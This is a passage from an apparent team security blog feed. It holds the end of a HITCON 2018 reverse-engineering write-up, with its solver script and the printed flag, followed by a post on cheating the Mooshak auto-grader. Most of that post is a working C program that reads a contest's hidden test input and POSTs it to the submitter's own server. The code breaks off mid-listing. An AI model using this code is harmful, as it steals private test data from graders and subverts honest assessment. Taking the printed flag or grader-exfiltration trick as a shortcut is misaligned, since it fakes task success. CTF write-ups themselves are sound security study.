class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    dword_560CC63C71C0 = array_of_ints_to_int(dword_560CC63C71B8[<span class="number">-4</span>:])</span><br><span class="line">    dword_560CC63C71C4 = array_of_ints_to_int(dword_560CC63C71B8[:<span class="number">4</span>])</span><br><span class="line">    dword_560CC63C71C8 = array_of_ints_to_int(dword_560CC63C71B0[<span class="number">-4</span>:])</span><br><span class="line">    dword_560CC63C71CC = array_of_ints_to_int(dword_560CC63C71B0[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">    dword_560CC63C71C8 = dword_560CC63C71C8 ^ access_offstream(</span><br><span class="line">        off_560CC63C7150, <span class="number">0x10</span>)</span><br><span class="line">    dword_560CC63C71CC = dword_560CC63C71CC ^ access_offstream(</span><br><span class="line">        off_560CC63C7150, <span class="number">0x14</span>)</span><br><span class="line">    dword_560CC63C71C0 = dword_560CC63C71C0 ^ access_offstream(</span><br><span class="line">        off_560CC63C7150, <span class="number">0x18</span>)</span><br><span class="line">    dword_560CC63C71C4 = dword_560CC63C71C4 ^ access_offstream(</span><br><span class="line">        off_560CC63C7150, <span class="number">0x1c</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span> * <span class="number">7</span>, <span class="number">-16</span>, <span class="number">-16</span>):</span><br><span class="line">        dword_560CC63C71D0 = shr_add_xor(dword_560CC63C71C8, off_560CC63C7150, [</span><br><span class="line">                                         <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x10</span>, <span class="number">0x18</span>], [<span class="number">0x40</span>, <span class="number">0x140</span>, <span class="number">0x240</span>, <span class="number">0x340</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>])[<span class="number">-1</span>]</span><br><span class="line">        dword_560CC63C71D4 = shr_add_xor(dword_560CC63C71CC, off_560CC63C7150, [</span><br><span class="line">                                         <span class="number">0x18</span>, <span class="number">0</span>, <span class="number">0x8</span>, <span class="number">0x10</span>], [<span class="number">0x40</span>, <span class="number">0x140</span>, <span class="number">0x240</span>, <span class="number">0x340</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>])[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        edx = dword_560CC63C71D0 + \</span><br><span class="line">            (dword_560CC63C71D4 + dword_560CC63C71D4) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        eax = (array_of_ints_to_int(off_560CC63C7150[</span><br><span class="line">               <span class="number">0x2c</span> + i:<span class="number">0x2c</span> + <span class="number">4</span> + i][::<span class="number">-1</span>]) + edx) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        dword_560CC63C71C4 = dword_560CC63C71C4 ^ eax</span><br><span class="line">        dword_560CC63C71C4 = ror(dword_560CC63C71C4, <span class="number">1</span>, max_bits)</span><br><span class="line">        dword_560CC63C71C0 = rol(dword_560CC63C71C0, <span class="number">1</span>, max_bits)</span><br><span class="line">        dword_560CC63C71C0 = sum_sum_xor(</span><br><span class="line">            dword_560CC63C71D0, dword_560CC63C71D4, dword_560CC63C71C0, off_560CC63C7150, <span class="number">0x28</span> + i)</span><br><span class="line"></span><br><span class="line">        dword_560CC63C71D0 = shr_add_xor(dword_560CC63C71C0, off_560CC63C7150, [</span><br><span class="line">                                         <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x10</span>, <span class="number">0x18</span>], [<span class="number">0x40</span>, <span class="number">0x140</span>, <span class="number">0x240</span>, <span class="number">0x340</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>])[<span class="number">-1</span>]</span><br><span class="line">        dword_560CC63C71D4 = shr_add_xor(dword_560CC63C71C4, off_560CC63C7150, [</span><br><span class="line">                                         <span class="number">0x18</span>, <span class="number">0</span>, <span class="number">0x8</span>, <span class="number">0x10</span>], [<span class="number">0x40</span>, <span class="number">0x140</span>, <span class="number">0x240</span>, <span class="number">0x340</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>])[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        edx = dword_560CC63C71D0 + \</span><br><span class="line">            ((dword_560CC63C71D4 + dword_560CC63C71D4) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        eax = (array_of_ints_to_int(off_560CC63C7150[</span><br><span class="line">               <span class="number">0x24</span> + i:<span class="number">0x24</span> + <span class="number">4</span> + i][::<span class="number">-1</span>]) + edx) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        dword_560CC63C71CC = dword_560CC63C71CC ^ eax</span><br><span class="line">        dword_560CC63C71CC = ror(dword_560CC63C71CC, <span class="number">1</span>, max_bits)</span><br><span class="line">        dword_560CC63C71C8 = rol(dword_560CC63C71C8, <span class="number">1</span>, max_bits)</span><br><span class="line">        dword_560CC63C71C8 = sum_sum_xor(</span><br><span class="line">            dword_560CC63C71D0, dword_560CC63C71D4, dword_560CC63C71C8, off_560CC63C7150, <span class="number">0x20</span> + i)</span><br><span class="line"></span><br><span class="line">    dwords_flaginput = [dword_560CC63C71C8, dword_560CC63C71CC]</span><br><span class="line">    dwords_flaginput2 = [dword_560CC63C71C0, dword_560CC63C71C4]</span><br><span class="line"></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>):</span><br><span class="line">        s += pack(<span class="string">"&lt;I"</span>, dwords_flaginput2[k] ^</span><br><span class="line">                  access_offstream(off_560CC63C7150, i))</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    s = pack(<span class="string">"&gt;Q"</span>, int(s.encode(<span class="string">'hex'</span>), <span class="number">16</span>) ^</span><br><span class="line">             array_of_ints_to_int(xor_keys_input0[x / <span class="number">2</span>:x / <span class="number">2</span> + <span class="number">8</span>]))</span><br><span class="line">    s1 = <span class="string">''</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>, <span class="number">8</span> * <span class="number">2</span>, <span class="number">4</span>):</span><br><span class="line">        s1 += pack(<span class="string">"&lt;I"</span>, dwords_flaginput[k] ^</span><br><span class="line">                   access_offstream(off_560CC63C7150, i))</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    s1 = pack(<span class="string">"&gt;Q"</span>, int(s1.encode(<span class="string">'hex'</span>), <span class="number">16</span>) ^</span><br><span class="line">              array_of_ints_to_int(xor_keys_input1[x / <span class="number">2</span>:x / <span class="number">2</span> + <span class="number">8</span>]))</span><br><span class="line"></span><br><span class="line">    flag += s + s1</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"hitcon&#123;"</span>+flag+<span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure><p>Running it to get the flag :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python reverselukaku.py </span><br><span class="line">hitcon&#123;~Exc3p7i0n-Ori3n7ed-Pr0grammin9~RoO0cks!!\o^_^o/&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;EOP&lt;br&gt;&lt;br&gt;EOP.&lt;br&gt;&lt;br&gt;eop-811afa1b9fb0c0719a75afd316ea2c57&lt;br&gt;Author: david942j&lt;br&gt;29 Teams solved.&lt;br&gt;&lt;br&gt;&lt;/blockquote&gt;

&lt;
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
    
      <category term="exceptions" scheme="https://teamrocketist.github.io/tags/exceptions/"/>
    
      <category term="hitcon2018" scheme="https://teamrocketist.github.io/tags/hitcon2018/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Mooshak - Stealing private tests from mooshak</title>
    <link href="https://teamrocketist.github.io/2018/10/14/Web-Mooshak-Stealing-private-tests-from-mooshak/"/>
    <id>https://teamrocketist.github.io/2018/10/14/Web-Mooshak-Stealing-private-tests-from-mooshak/</id>
    <published>2018-10-14T20:01:50.000Z</published>
    <updated>2018-10-24T23:21:04.838Z</updated>
    
    <content type="html"><![CDATA[<p>A long time ago in a secret meme group far far away I did find this:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Be1WLE5.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Be1WLE5.png" alt=""><br></a></p><p>This meme made me giggle straight way, not because of the meme itself but the message “If we only could do this”, back in the day I already how to do it but never tested it out in a live server for obvious reasons and lets make it clear IST projects nowadays are so easy we don’t really need have to cheat.</p><p>Finally decided to do a write up about this, I downloaded <a href="https://mooshak.dcc.fc.up.pt/" target="_blank" rel="noopener">mooshak</a> and installed on a VM machine and created a c contest. I don’t really consider this an attack or a hack, if we were talking about games we could easily say this was “clever use of game mechanics”, as you know most of the project contests in IST have this basic idea to run tests:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input -&gt; Receives the input of a specific test into your program.</span><br><span class="line">Output -&gt; Compares the output of your project and server output (this is what determines whether you passed or not a test).</span><br></pre></td></tr></table></figure><p>As we know we are going to read the input into memory, since we can <strong><em>control the code</em></strong> and what is running, we just need to find a way to <strong><em>sent the information out</em></strong> to ourselves, one way to do this is by using <strong><em>GET</em></strong> or <strong><em>POST</em></strong> requests:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/VpElHW1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VpElHW1.png" alt=""><br></a></p><p>The <strong><em>GET</em></strong> request has a limit of 8192 bytes so in a bigger input test you won’t be able to send the entire test so I recommend to use a <strong><em>POST</em></strong> , writing the code necessary in c to do this is quite challenging but in another languages like python, lisp or even prolog is quite simple, speaking about the endpoint that are going to receive our requests you either write in php or any other language.</p><p>The test.c file:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _DEFAULT_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_tcp_socket</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_ip</span><span class="params">(<span class="keyword">char</span> *host)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">build_get_query</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">char</span> *page)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">join_strings</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">http_request</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span>* path, <span class="keyword">char</span>* method)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">build_post_query</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">char</span> *page, <span class="keyword">char</span>* post_data)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOST <span class="meta-string">"127.0.0.1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE <span class="meta-string">"/wtf.php"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERAGENT <span class="meta-string">"HTMLGET 1.0"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">url_encode</span><span class="params">(<span class="keyword">char</span> *str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET request limit is 8192 bytes we could try a post request but would be to heavy to ther server with 1 million nodes*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  <span class="keyword">char</span> c; </span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> size = <span class="number">16</span>;</span><br><span class="line">  http_request(<span class="number">3</span>, argv, url_encode(<span class="string">"---------------"</span>), <span class="string">"post"</span>);</span><br><span class="line">  str = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*size + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ((c = getchar()) != EOF) &#123;</span><br><span class="line">    str[i++]=c;</span><br><span class="line">    <span class="keyword">if</span> (i == size) &#123;</span><br><span class="line">        str = <span class="built_in">realloc</span>(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>)*(size+=<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  str[i++]=<span class="string">'\0'</span>;</span><br><span class="line">  http_request(<span class="number">3</span>, argv, url_encode(str), <span class="string">"post"</span>);</span><br><span class="line">  <span class="built_in">free</span>(str);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Converts a hex character to its integer value */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">from_hex</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">isdigit</span>(ch) ? ch - <span class="string">'0'</span> : <span class="built_in">tolower</span>(ch) - <span class="string">'a'</span> + <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Converts an integer value to its hex character*/</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">to_hex</span><span class="params">(<span class="keyword">char</span> code)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> hex[] = <span class="string">"0123456789abcdef"</span>;</span><br><span class="line">  <span class="keyword">return</span> hex[code &amp; <span class="number">15</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns a url-encoded version of str */</span></span><br><span class="line"><span class="comment">/* IMPORTANT: be sure to free() the returned string after use */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">url_encode</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *pstr = str, *buf = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(str) * <span class="number">3</span> + <span class="number">1</span>), *pbuf = buf;</span><br><span class="line">  <span class="keyword">while</span> (*pstr) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isalnum</span>(*pstr) || *pstr == <span class="string">'-'</span> || *pstr == <span class="string">'_'</span> || *pstr == <span class="string">'.'</span> || *pstr == <span class="string">'~'</span>) </span><br><span class="line">      *pbuf++ = *pstr;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*pstr == <span class="string">' '</span>) </span><br><span class="line">      *pbuf++ = <span class="string">'+'</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">      *pbuf++ = <span class="string">'%'</span>, *pbuf++ = to_hex(*pstr &gt;&gt; <span class="number">4</span>), *pbuf++ = to_hex(*pstr &amp; <span class="number">15</span>);</span><br><span class="line">    pstr++;</span><br><span class="line">  &#125;</span><br><span class="line">  *pbuf = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns a url-decoded version of str */</span></span><br><span class="line"><span class="comment">/* IMPORTANT: be sure to free() the returned string after use */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">url_decode</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *pstr = str, *buf = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(str) + <span class="number">1</span>), *pbuf = buf;</span><br><span class="line">  <span class="keyword">while</span> (*pstr) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*pstr == <span class="string">'%'</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (pstr[<span class="number">1</span>] &amp;&amp; pstr[<span class="number">2</span>]) &#123;</span><br><span class="line">        *pbuf++ = from_hex(pstr[<span class="number">1</span>]) &lt;&lt; <span class="number">4</span> | from_hex(pstr[<span class="number">2</span>]);</span><br><span class="line">        pstr += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*pstr == <span class="string">'+'</span>) &#123; </span><br><span class="line">      *pbuf++ = <span class="string">' '</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      *pbuf++ = *pstr;</span><br><span class="line">    &#125;</span><br><span class="line">    pstr++;</span><br><span class="line">  &#125;</span><br><span class="line">  *pbuf = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">http_request</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span>* path, <span class="keyword">char</span>* method)</span> </span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">remote</span>;</span></span><br><span class="line">  <span class="keyword">int</span> sock;</span><br><span class="line">  <span class="keyword">int</span> tmpres;</span><br><span class="line">  <span class="keyword">char</span> *ip;</span><br><span class="line">  <span class="keyword">char</span> *get;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFSIZ+<span class="number">1</span>];</span><br><span class="line">  <span class="comment">/*char webpage[1000];*/</span></span><br><span class="line">  <span class="keyword">char</span> *host = HOST;</span><br><span class="line">  <span class="keyword">char</span> *page;</span><br><span class="line">  <span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> htmlstart = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">char</span> * htmlcontent;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>)&#123;</span><br><span class="line">    usage();</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  host = HOST;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"get"</span>, method) == <span class="number">0</span>)</span><br><span class="line">    page = join_strings(PAGE, url_encode(path));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    page = PAGE;</span><br><span class="line">  sock = create_tcp_socket();</span><br><span class="line">  ip = get_ip(host);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"IP is %s\n"</span>, ip);</span><br><span class="line">  remote = (struct sockaddr_in *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct sockaddr_in *));</span><br><span class="line">  remote-&gt;sin_family = AF_INET;</span><br><span class="line">  tmpres = inet_pton(AF_INET, ip, (<span class="keyword">void</span> *)(&amp;(remote-&gt;sin_addr.s_addr)));</span><br><span class="line">  <span class="keyword">if</span>( tmpres &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(tmpres == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s is not a valid IP address\n"</span>, ip);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  remote-&gt;sin_port = htons(PORT);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(connect(sock, (struct sockaddr *)remote, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(method, <span class="string">"get"</span>) == <span class="number">0</span>) </span><br><span class="line">    get = build_get_query(host, page);</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    get = build_post_query(host, page, path);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Query is:\n&lt;&lt;START&gt;&gt;\n%s&lt;&lt;END&gt;&gt;\n"</span>, get);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*Send the query to the server*/</span></span><br><span class="line">  sent = <span class="number">0</span>; </span><br><span class="line">  <span class="keyword">while</span>(sent &lt; <span class="built_in">strlen</span>(get)) &#123;</span><br><span class="line">    tmpres = send(sock, get+sent, <span class="built_in">strlen</span>(get)-sent, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(tmpres == <span class="number">-1</span>) &#123;</span><br><span class="line">     </span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sent += tmpres;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*now it is time to receive the page*/</span></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  htmlstart = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>((tmpres = recv(sock, buf, BUFSIZ, <span class="number">0</span>)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(htmlstart == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">/* Under certain conditions this will not work.</span></span><br><span class="line"><span class="comment">      * If the \r\n\r\n part is splitted into two messages</span></span><br><span class="line"><span class="comment">      * it will fail to detect the beginning of HTML content</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      htmlcontent = <span class="built_in">strstr</span>(buf, <span class="string">"\r\n\r\n"</span>);</span><br><span class="line">      <span class="keyword">if</span>(htmlcontent != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        htmlstart = <span class="number">1</span>;</span><br><span class="line">        htmlcontent += <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> 